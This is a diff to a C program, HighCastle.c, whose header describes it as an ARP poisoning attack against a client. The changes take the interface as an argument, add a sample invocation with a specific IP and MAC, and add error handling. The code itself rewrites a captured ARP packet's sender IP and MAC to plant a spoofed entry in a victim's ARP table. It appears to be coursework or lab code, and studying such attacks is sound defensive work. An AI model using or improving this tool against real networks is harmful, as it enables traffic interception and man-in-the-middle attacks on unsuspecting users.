@@ -1,4 +1,4 @@
-/**************************************************
+/******************************************************
 HighCastle.c
 
 Date: October 8, 2018
@@ -9,8 +9,9 @@ Purpose: This program performs a ARP poison attack
          against a client.
 
 Sample Invocation:
-  ./HighCastle <Spoof_IP> <Spoof_MAC>
-**************************************************/
+  sudo ./HighCastle <Interface> <Spoof_IP> <Spoof_MAC>
+  sudo ./HighCastle eno1 10.10.22.22 94:c6:91:a0:91:8d
+******************************************************/
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -46,15 +47,29 @@ int main(int argc, char **argv) {
     eth_addr_t ether_address;
 
     /* Find a device */
-    device = "eno1";//pcap_lookupdev(error_buffer);
+    device = argv[1];//pcap_lookupdev(error_buffer);
     pcap_lookupnet(device, &ip, &subnet_mask, error_buffer);
 
     /* Open device for live capture */
     handle = pcap_open_live(device, BUFSIZ, 1, 10000, error_buffer);
+    if(!handle && error_buffer){
+      printf("%s\n", error_buffer);
+      exit(1);
+    }
 
-    /* Open second device to read from file and read*/
+    /* Open second device to read from file */
     handle2 = pcap_open_offline("arp.pcap", error_buffer);
+    if(!handle2 && error_buffer){
+      printf("%s\n", error_buffer);
+      exit(1);
+    }
+
+    /* Read in 1 packet from file */
     packet = pcap_next(handle2, &packet_header);
+    if(!packet && error_buffer){
+      printf("%s\n", error_buffer);
+      exit(1);
+    }
 
     arp_header = (struct arphdr*) (packet + sizeof(struct ether_header));
 
@@ -64,9 +79,9 @@ int main(int argc, char **argv) {
     memcpy(&eth_header->ether_dhost, &ether_address, ETH_ADDR_LEN);
 
     //Insert this record into the victim's ARP table.
-    inet_pton(AF_INET, argv[1], &(ip_address.addr_ip));
+    inet_pton(AF_INET, argv[2], &(ip_address.addr_ip));
     memcpy(&arp_header->spa, &ip_address.addr_ip, IP_ADDR_LEN);
-    eth_pton(argv[2], &ether_address);
+    eth_pton(argv[3], &ether_address);
     memcpy(&arp_header->sha, &ether_address, ETH_ADDR_LEN);
 
     //Eh do I need this?
